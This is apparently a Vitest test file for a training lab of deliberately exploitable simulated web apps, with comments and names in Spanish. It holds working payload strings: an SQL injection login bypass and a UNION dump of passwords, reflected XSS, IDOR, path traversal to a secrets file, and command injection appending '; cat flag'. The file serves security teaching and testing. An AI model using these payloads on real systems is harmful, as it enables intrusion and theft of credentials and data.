import { describe, expect, it, beforeEach } from "vitest";
import { WebServer } from "./WebServer";
import { BankApp } from "./apps/bank";
import { BlogApp, PhotosApp, FilesApp, ToolsApp } from "./apps/labs";

function nuevoServidor(): WebServer {
  const s = new WebServer();
  s.register(new BankApp());
  s.register(new BlogApp());
  s.register(new PhotosApp());
  s.register(new FilesApp());
  s.register(new ToolsApp());
  return s;
}

describe("laboratorios web explotables", () => {
  let s: WebServer;

  beforeEach(() => {
    s = nuevoServidor();
  });

  describe("banco: SQLi en el login", () => {
    it("con credenciales válidas entra y da sesión", () => {
      const res = s.request("POST", "banco.nande", "/login", "", {
        usuario: "rocio",
        password: "girasol77",
      });
      expect(res.status).toBe(302);
      expect(res.setCookies.sesion).toBeTruthy();
    });

    it("admin'-- evade la contraseña y da sesión de admin", () => {
      const res = s.request("POST", "banco.nande", "/login", "", {
        usuario: "admin'--",
        password: "cualquier-cosa",
      });
      expect(res.status).toBe(302);
      const cookie = `sesion=${res.setCookies.sesion}`;
      const panel = s.request("GET", "banco.nande", "/panel", cookie);
      expect(panel.body).toContain("ND{sqli_login_bypass}");
    });

    it("credenciales incorrectas no dan sesión", () => {
      const res = s.request("POST", "banco.nande", "/login", "", {
        usuario: "rocio",
        password: "mal",
      });
      expect(res.setCookies.sesion).toBeFalsy();
    });

    it("UNION en el buscador extrae la tabla de contraseñas", () => {
      const login = s.request("POST", "banco.nande", "/login", "", {
        usuario: "rocio",
        password: "girasol77",
      });
      const cookie = `sesion=${login.setCookies.sesion}`;
      const inj =
        "%' UNION SELECT id, usuario, password, rol FROM usuarios -- ";
      const res = s.request(
        "GET",
        "banco.nande",
        `/movimientos?q=${encodeURIComponent(inj)}`,
        cookie,
      );
      expect(res.body).toContain("M8arete-2024!");
    });
  });

  it("blog: refleja un <script> sin escapar (XSS)", () => {
    const res = s.request(
      "GET",
      "blog.yvoty.nande",
      "/buscar?q=" + encodeURIComponent("<script>alert(1)</script>"),
    );
    expect(res.body).toContain("<script>alert(1)</script>");
  });

  it("fotos: IDOR muestra el álbum ajeno con la bandera", () => {
    const res = s.request("GET", "fotos.arandu.nande", "/album?id=7");
    expect(res.body).toContain("ND{idor_album_ajeno}");
  });

  it("archivos: path traversal llega al secrets.env", () => {
    const res = s.request(
      "GET",
      "docs.tape.nande",
      "/ver?archivo=" + encodeURIComponent("../config/secrets.env"),
    );
    expect(res.body).toContain("ND{path_traversal_secreto}");
  });

  it("herramientas: inyección de comandos con ; cat flag", () => {
    const res = s.request(
      "GET",
      "tools.pyta.nande",
      "/ping?host=" + encodeURIComponent("127.0.0.1; cat flag"),
    );
    expect(res.body).toContain("ND{cmd_injection_pwned}");
  });

  it("host inexistente da 404", () => {
    expect(s.request("GET", "no-existe.nande", "/").status).toBe(404);
  });
});
